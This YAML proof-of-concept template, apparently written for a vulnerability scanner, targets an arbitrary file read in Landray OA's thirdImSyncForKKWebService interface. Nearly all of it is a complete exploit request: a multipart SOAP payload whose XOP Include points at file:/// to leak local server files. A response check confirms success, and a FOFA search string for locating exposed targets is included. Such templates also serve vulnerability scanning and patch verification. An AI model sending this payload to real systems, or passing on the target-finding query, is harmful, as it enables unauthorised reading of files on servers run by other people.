pocs/unverified/landray-oa-thirdImSyncForKKWebService-fileread.yml

id: landray-oa-thirdImSyncForKKWebService-fileread
info:
  name: Landray OA thirdImSyncForKKWebService File Read
  author: ZacharyZcR
  severity: high
  description: |
    Landray OA thirdImSyncForKKWebService interface has an arbitrary file read vulnerability.
    FOFA: body="Com_Parameter"
  reference:
    - https://mp.weixin.qq.com/s/9xcoXmoJb8GJnID4D2Wa-g

rules:
  r0:
    request:
      method: POST
      path: /sys/webservice/thirdImSyncForKKWebService
      headers:
        Content-Type: multipart/related; boundary=----oxmmdmlnvlx08yluof5q
        SOAPAction: ""
      body: |
        ------oxmmdmlnvlx08yluof5q
        Content-Disposition: form-data; name="a"
        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.kk.im.third.kmss.landray.com/">
        <soapenv:Header/>
        <soapenv:Body>
        <web:getTodo>
        <arg0>
        <otherCond>1</otherCond>
        <pageNo>1</pageNo>
        <rowSize>1</rowSize>
        <targets>1</targets>
        <type><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="file:///"/></type>
        </arg0>
        </web:getTodo>
        </soapenv:Body>
        </soapenv:Envelope>
        ------oxmmdmlnvlx08yluof5q--
    expression: response.status == 500 && response.body.bcontains(b'<soap:Envelope') && response.body.bcontains(b'<faultstring>') && response.body.bcontains(b'Unmarshalling Error')

expression: r0()